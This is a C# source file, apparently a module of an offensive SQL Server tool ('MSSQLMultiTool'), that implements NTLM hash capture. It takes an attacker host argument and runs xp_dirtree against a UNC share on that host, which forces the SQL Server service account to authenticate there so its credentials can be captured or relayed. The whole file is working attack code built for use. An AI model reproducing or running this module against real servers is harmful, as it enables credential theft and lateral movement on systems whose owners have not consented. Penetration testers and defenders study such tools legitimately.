using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MSSQLMultiTool.outputsLib;
using System.Data.SqlClient;



namespace MSSQLMultiTool.Modules
{
    class NtlmCapture
    {
        static void checkArguments(Dictionary<string, string> arguments)
        {
            try
            {
                if (!arguments.ContainsKey("attackerbox"))
                {
                    outputs.printError("Missing AttackerBox \n");
                    help();
                    Environment.Exit(0);
                }
            }
            catch (Exception e)
            {
                outputs.printError("Missing AttackerBox \n");
                help();
                Environment.Exit(0);
            }
        }
        public static void help()
        {
            Console.WriteLine("--module ntlm\n");
            Console.WriteLine("     Arguments:\n");
            Console.WriteLine("     --attackerbox <attackerbox>\n");
        }
        public static void run(Dictionary<string,string> arguments, SqlConnection con)
        {
            outputs.printHeader("Loading NTLM Capture Module");

            checkArguments(arguments);

            String res;
            String targetShare = $"\\\\{arguments["attackerbox"]}\\share";
            res = SQLModule.executeQuery($"EXEC master..xp_dirtree \"{targetShare}\";", con);

            outputs.printSuccess($"Triggered UNC injection on {arguments["instance"]}");
        }
    }
}
